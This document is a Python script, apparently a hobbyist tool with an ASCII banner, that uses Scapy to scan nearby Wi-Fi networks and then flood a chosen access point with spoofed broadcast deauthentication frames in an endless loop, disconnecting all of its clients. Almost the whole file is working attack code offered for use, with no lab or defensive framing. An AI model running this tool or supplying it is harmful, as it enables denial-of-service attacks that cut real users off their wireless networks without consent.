import sys

import time
from scapy.all import (Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, Dot11ProbeReq)
from scapy.all import sniff
from scapy.all import RadioTap
from scapy.all import sendp

def scan_networks(interface):
    print("[+] Scanning for available networks...")
    networks = {}
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt.getlayer(Dot11Elt).info.decode(errors='ignore')
            bssid = pkt.getlayer(Dot11).addr2
            if bssid not in networks:
                networks[bssid]=ssid
                print(f"[+] Found: SSID: {ssid}, BSSID: {bssid}")
                
        elif pkt.haslayer(Dot11ProbeReq):
            ssid = pkt.getlayer(Dot11Elt).info.decode(errors='ignore')
            bssid = pkt.getlayer(Dot11).addr2
            if bssid not in networks:
                networks[bssid]=ssid
                print(f"[+] Found: SSID: {ssid}, BSSID: {bssid}")
            
    sniff(iface=interface, prn=packet_handler, timeout=30)
    return networks
    
def deauth_attack(interface, target_bssid):
    print(f"[+] Start deauth-attack  on {target_bssid}...")
    pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)/Dot11Deauth(reason=7)
    while True:
        sendp(pkt, iface=interface, count=100, inter=0.1, verbose=False)
        print("[+] Deauth-packets sent! (Ctrl+c to stop)")
        time.sleep(0.5)
    
if __name__=="__main__":

    interface = "wlan0mon"
    
    print('__    __ _  __  __  _  _     _')
    print('\ \/\/ /| ||  |/  /| || |__ | |__')  
    print(' \_/\_/ |_||__|\__\|_||____||____|') 
    print('by nyquist42')
    print()
    print('01: Show all SSIDs in your range')
    print('02: Start an attack on a network')
    print()
    option = input('Select an option: ')
    
    if option=="1" or option=="01":
        networks = scan_networks(interface)
        if not networks:
            print("[-] No networks found")
        else:
            print("[+] Scan done")
            
    elif option=="2" or option=="02":
        networks=scan_networks(interface)
        if not networks:
            print("[-] No networks found. Quitting...")
            sys.exit(1)
        print("\nAvailable networks:")
        for i, (bssid, ssid) in enumerate(networks.items()):
            print(f"{i+1}: SSID: {ssid} | BSSID: {bssid}")
        target_index = int(input("\n Choose wich network you want to attack: ").strip())-1
        target_bssid = list(networks.keys())[target_index]
        deauth_attack(interface, target_bssid)
    else:
        print("[-] Invalid option. Quitting...")
        
        



